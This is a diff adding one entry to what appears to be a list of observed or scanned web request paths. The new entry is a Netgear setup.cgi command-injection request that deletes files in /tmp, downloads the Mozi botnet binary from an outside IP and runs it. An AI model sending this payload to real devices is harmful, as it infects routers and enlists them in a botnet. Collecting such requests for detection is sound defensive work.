@@ -13700,3 +13700,4 @@ srv57c0d2365c3c.korsan.me:443
 /temp.war
 /ROOT.sql.z
 /backup.sql.tar.z
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.8.24.167:43648/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
